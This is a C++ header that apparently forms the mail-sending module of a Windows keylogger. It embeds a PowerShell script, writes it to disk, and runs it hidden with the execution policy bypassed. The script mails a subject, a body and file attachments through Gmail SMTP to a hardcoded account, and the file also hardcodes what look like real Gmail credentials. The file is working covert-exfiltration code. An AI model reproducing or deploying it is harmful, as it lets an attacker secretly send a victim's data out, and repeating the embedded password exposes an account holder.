#ifndef SENDMAIL_H
#define SENDMAIL_H
#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME "sm.ps1"
/*
    This file is used to send mail from out code to remote server.
    To send a mail we have to implement mail protocol - SMTP
        SMTP stands for Simple Mail Transfer Protocol
    It is used to send mails between mail servers (or computers). Default
    port number is 25. Sooo, that's a very complicated and very long process
    and, we cannot use secure layer (SSL or TLS) to send mail to secure
    mail servers (for example, gmail.com). To do that, we need to implement our
    own SSL/TLS library... or use external. The same thing is for sending mail
    implement non-secure SMTP or use external library.

    Neither. We'll use external program to send mails, program that is 100%
    installed on operating system. That is, Windows PowersSell (PS). Below is a PS
    script that will be printed to our directory and called to send a mail.
    Of course, you can use external library to send mails, or to implement your own...

    Script and functions to call it are defined bellow.
    But exactly the same code (commented) is in this comment. This is a powershell script.
    Comment(s) start with "#"
***************************************************************************************
                                        SCRIPT START
***************************************************************************************
    Param( #parameters to our script
   #list of attachments, separated by "::".
   #I decided to use a "::" separator because it is not possible that this sequence
   #is part of a real path. For example "E:\log1.txt::E\log2.txt" and so on
   [String]$Att,
   [String]$Subj, #mail subject
   [String]$Body #mail body
)
#the original code, I've modified it to fit my needs
#http://stackoverflow.com/a/12463018
Function Send-EMail { #our powershell function; we cell Send-EMail from script directly
    Param (
        [Parameter(`
            Mandatory=$true)]  #mandatory: yes
        [String]$To,           #function parameter "to", specifies recipient
         [Parameter(`
            Mandatory=$true)]
        [String]$From,         #function parameter "to", specifies sender (user@server.com)
        [Parameter(`
            mandatory=$true)]
        [String]$Password,     #password (we use gmail, credentials are {user, password}
        [Parameter(`
            Mandatory=$true)]
        [String]$Subject,      #subject - mail subject
        [Parameter(`
            Mandatory=$true)]
        [String]$Body,         #body, body of the mail
        [Parameter(`
            Mandatory=$true)]
        [String]$attachment    #attachment, string of attachments separated by ::
    )#end parameter list
    #try block, exception are common when comunication over network
    try
        {
            #Msg is our variable (of type MailMessage)
            $Msg = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)
            #our server, of course smtp.gmail.com, predefined
            $Srv = "smtp.gmail.com"
            if ($attachment -ne $null) { #check for attachments
                try
                    {
                        #split string on :: into array
                        #we use "string - split" instead of string.split
                        #because -split uses regex (regular expressions)
                        $Attachments = $attachment -split ("\:\:");

                        #for each loop in powershell
                        #iterating on list of attachments
                        ForEach ($val in $Attachments)
                            {
                                #create an attachment object (file MUST exists)
                                $attch = New-Object System.Net.Mail.Attachment($val)
                                #add it to message attachments
                                $Msg.Attachments.Add($attch)
                            }
                    }
                catch
                    {
                        exit 2; #attachment not found, or.. don't have permission
                    }
            }
            #create our client variable, {gmail.smtp.com, 587}
            $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL
            #mandatory: enable SSL
            $Client.EnableSsl = $true
            #From is in format user@server.com, so, we use the "user" part for credentials
            $Client.Credentials = New-Object System.Net.NetworkCredential($From.Split("@")[0], $Password);
            $Client.Send($Msg) #send message
            Remove-Variable -Name Client #free resources
            Remove-Variable -Name Password
            exit 7; #everything went OK
          }
      catch
          {
            exit 3; #error, something went wrong :(
          }
} #End Function Send-EMail
#this is outside of Send-EMail function (global code)
#THIS block of code will be executed on script start
try
    {
        #we just call out function, passing parameters:
        Send-EMail
            -attachment $Att
            -To "our.destination@email.address"
            -Body $Body
            -Subject $Subj
            -password "our.secret.pass"
            -From "out.email@addres.hehe"
    }
catch
    {
        exit 4; #well, calling the function is wrong? not enough parameters
    }

***************************************************************************************
                                        SCRIPT END
***************************************************************************************
*/
namespace Mail
{
    //these are login information for our mail server
    //we define them locally and undefine it right after variable definition

    #define X_EM_TO "jobs.abt.kl@gmail.com"
    #define X_EM_FROM "jobs.abt.kl@gmail.com"
    #define X_EM_PASS "Jobs.ABt7.KL"

//our script code... yes, we know, it is unredable, but who cares
//it is script that will be executed to send mail and that is that
const std::string &PowerShellScript =
"Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
"  ForEach ($val in $Attachments)\r\n                    "
"        {\r\n               "
"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
"}\r\n                catch\r\n                    {\r\n                        exit 2; "
"#attachment not found, or.. dont have permission\r\n                    }\r\n            }\r\n "
"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
"exit 7; #everything went OK\r\n          }\r\n      catch\r\n          {\r\n            exit 3; #error,"
" something went wrong :(\r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
"Send-EMail -attachment $Att "
"-To \"" +
 std::string (X_EM_TO) +  //TO
 "\""
" -Body $Body -Subject $Subj "
"-password \"" +
 std::string (X_EM_PASS) + //PASSWORD
  "\""
" -From \"" +
 std::string (X_EM_FROM) + //FROM
"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; #well, calling the function is wrong? not enough parameters\r\n    }";

    //un-define variables (our credintials)
    #undef X_EM_FROM
    #undef X_EM_TO
    #undef X_EM_PASS

    //helper function that replaces portion of "what" of string "str" with "with"
    //it is used to escape quotes when sending mails...
    std::string StringReplace (std::string s, const std::string &what, const std::string &with)
        {
            //if empty, we dont't have anything to replace...
            if(what.empty())
                return s;
            //sp = string position
            size_t sp = 0;
            //iterate through string while replacing portions
            //until all portions have been replaced...
            //string::npos is "end" of string
            while((sp = s.find(what, sp)) != std::string::npos)
                s.replace(sp, what.length(), with), sp += with.length();
            //return the modified string...
            return s;
        }
    //helper function to check if our script (or another file) exists
    //it just try to open file for reading...
    bool CheckFileExists (const std::string &f)
        {
            std::ifstream file (f);
            return (bool)file;
        }
    //helper function that creates (outputs) our powershell script
    bool CreateScript()
        {
            //create an ofstream object (output file stream)
            //parameter is path to the file we want to create
            std::ofstream script (IO::GetOurPath(true) + std::string(SCRIPT_NAME));
            //if creation was not OK
            if (!script)
                return false; //just return from the function
            //else, output script to file
            script << PowerShellScript;
            //check if writing to the file was OK
            if (!script)
                return false;
            //close file
            script.close();
            //signalize that creation was succesful
            return true;
        }
    /*
        our function for sending mail; it performs next steps:
            1. check if there is our script
            2. if not, create it, if yes, skip creation
            3. call it
        parameters are self descriptible
    */
    Timer m_timer;
    int SendMail (const std::string &subject, const std::string &body, const std::string &attachments)
        {
            bool ok;
            //first, create directory if not exists
            ok  = IO::MkDir(IO::GetOurPath(true));
            if (!ok)
                return -1; //-1 means "we cannot create directory"
            std::string scr_path = IO::GetOurPath(true) + std::string (SCRIPT_NAME);
            //check if script exists
            if (!CheckFileExists(scr_path))
                ok = CreateScript(); //if not, create it
            if (!ok) //if createion was unsucessful, report to caller function
                return -2; //-2 means "we cannot create script"

            //powershell requres admin privileges to execute a script, or, at least
            //user action to enable execution of scripts... so we need to bypass it
            //with "-ExecutionPolicy ByPass" argument
            //we also pass other arguments as explained on the top of the file
            std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                                + StringReplace(subject, "\"", "\\\"") + //replace " with \"
                                 "\" -Body \""
                                 + StringReplace(body, "\"", "\\\"") +  //replace " with \"
                                  "\" -Att \"" + attachments + "\"";
            //to launch an external powershell script, we use ShellExecuteEx function
            //which accepts pointer to this structure:

            //create structure SHELLEXECUTEINFO
            SHELLEXECUTEINFO ShExecInfo = {0};
            //fill it, size is alway size of structure
            ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
            //Flags that indicate the content and validity
            //of the other structure members
            //SEE_MASK_NOCLOSEPROCESS is used so we know
            //the process handle
            ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
            //handle to window, usualy NULL
            ShExecInfo.hwnd = NULL;
            //operation to perform, "edit", "open", "print"...
            ShExecInfo.lpVerb = "open";
            //file to execute, we use "powershell"
            ShExecInfo.lpFile = "powershell";
            //parameters...
            ShExecInfo.lpParameters = param.c_str();
            //working directory, we don't need it, so NULL
            ShExecInfo.lpDirectory = NULL;
            //visibility of the created window
            //SW_HIDE will hide it
            ShExecInfo.nShow = SW_HIDE;
            //this is out parameter, function will set it to handle to
            //instance
            ShExecInfo.hInstApp = NULL;
            //call function
            ok = (bool)ShellExecuteEx(&ShExecInfo);
            if (!ok)
                return -3; //-3 means "script cannot be executed"
            //to find out return code of the script
            //we need to wait...
            //ShExecInfo.hProcess is a handle to our newly created process
            //we'll wait 7 second (7 000 milliseconds)
            WaitForSingleObject(ShExecInfo.hProcess, 7000);
            DWORD exit_code = 100;
            GetExitCodeProcess (ShExecInfo.hProcess, &exit_code);
            //give it another chance, one minute
            m_timer.SetFunction ([&]()
                     {
                        WaitForSingleObject(ShExecInfo.hProcess, 60000);
                        //get the script's exit code after 10 seconds
                        //259 means STILL_ACTIVE, which means process is still running
                        GetExitCodeProcess (ShExecInfo.hProcess, &exit_code);
                            if ((int)exit_code == STILL_ACTIVE) //if active
                         TerminateProcess(ShExecInfo.hProcess, 100); //kill it
                         Helper::WriteAppLog ("<From SendMail> Return code: " + Helper::ToString ((int)exit_code));
                     });
            m_timer.RepeatCount (1L); //execute only once
            m_timer.SetInterval (10L); //after 10 ms
            m_timer.Start (true); //start async
            return (int)exit_code;
        }
    //overloaded function that accepts array/vector of strings that represents
    //list of attachment
    int SendMail (const std::string &subject, const std::string &body, const std::vector<std::string> &att)
        {
            //it will construct string and call previuos version of SendMail
            //function...
            //resulting string will be in "attachment1::attachment2::..." format
            std::string attachments = "";
            if (att.size() == 1U) //only one attachment
                attachments = att.at(0);
            //construct a string of attachments
            for (const auto &v : att)
                attachments += v + "::";
            //remove the last "::"
            attachments = attachments.substr (0, attachments.length() - 2);
            //cal original function
            return SendMail(subject, body, attachments);
        }
}
#endif // SENDMAIL_H
